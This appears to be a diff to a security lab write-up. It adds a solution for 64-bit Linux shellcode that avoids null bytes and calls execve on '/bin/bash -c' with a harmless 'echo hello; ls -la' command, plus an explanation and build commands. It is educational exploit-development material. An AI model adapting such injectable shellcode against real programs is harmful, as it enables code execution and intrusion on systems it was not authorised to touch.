@@ -263,7 +263,8 @@ Please show the revised mysh64.s and explain how you get rid of each single zero
 ##### solution
 Here's the revised code
 
-(Shellcode/mysh64_no_zero.s)
+- code : `Shellcode/mysh64_no_zero.s`
+- gdb output : `Shellcode/task2b_output.txt`
 
 ```nasm
 section .text
@@ -348,6 +349,90 @@ argv[1] = address of the "-c" string
 argv[2] = address of the command string "echo hello; ls -la"
 argv[3] = 0
 ```
+##### solution
+code 
+
+```nasm
+section .text
+  global _start
+    _start:
+        BITS 64
+        jmp short two
+    one:
+        pop rbx           ; rbx points to the string area
+
+        ; Set up /bin/bash string termination
+        xor al, al
+        mov [rbx+9], al  ; Terminate /bin/bash
+
+        ; Set up -c string termination
+        mov [rbx+12], al ; Terminate -c
+
+        ; Set up command string termination
+        mov [rbx+31], al ; Terminate the command string
+
+        ; Set up argv array
+        lea rax, [rbx]        ; /bin/bash string
+        mov [rbx+32], rax     ; argv[0]
+
+        lea rax, [rbx+10]     ; -c string
+        mov [rbx+40], rax     ; argv[1]
+
+        lea rax, [rbx+13]     ; command string
+        mov [rbx+48], rax     ; argv[2]
+
+        xor rax, rax
+        mov [rbx+56], rax     ; argv[3] = NULL
+
+        ; Execute execve
+        mov rdi, rbx          ; First arg: pathname
+        lea rsi, [rbx+32]     ; Second arg: argv array
+        xor rdx, rdx          ; Third arg: envp = NULL
+        mov al, 59            ; syscall number for execve
+        syscall
+
+    two:
+        call one
+        ; String table
+        db '/bin/bash'    ; 9 bytes
+        db 0xFF
+        db '-c'           ; 2 bytes
+        db 0xFF
+        db 'echo hello; ls -la'  ; 18 bytes
+        db 0xFF
+        ; Space for argv array (4 pointers = 32 bytes)
+        db 'AAAAAAAA'     ; argv[0]
+        db 'BBBBBBBB'     ; argv[1]
+        db 'CCCCCCCC'     ; argv[2]
+        db 'DDDDDDDD'     ; argv[3]
+```
+
+Key changes made:
+
+1. Changed `/bin/sh` to `/bin/bash`
+2. Added the `-c` argument
+3. Added the command string `echo hello; ls -la`
+4. Modified the array structure to hold 4 elements instead of 2
+5. Updated all the offsets accordingly
+6. Added proper null termination for all strings
+7. Created the complete argv array with all required pointers
+
+To compile and test:
+```bash
+nasm -f elf64 mysh64.s -o mysh64.o
+ld mysh64.o -o mysh64
+./mysh64
+```
+
+This should execute bash with the command `echo hello; ls -la`, which will:
+1. Print "hello" to the console
+2. Show a detailed listing of the current directory
+
+The shellcode avoids null bytes by:
+- Using `xor` to generate zeros
+- Using `0xFF` as string terminators initially
+- Using minimal registers where possible
+- Using `lea` for address calculations
 
 #### 3.4 Task 2.d. Pass environment variables
 
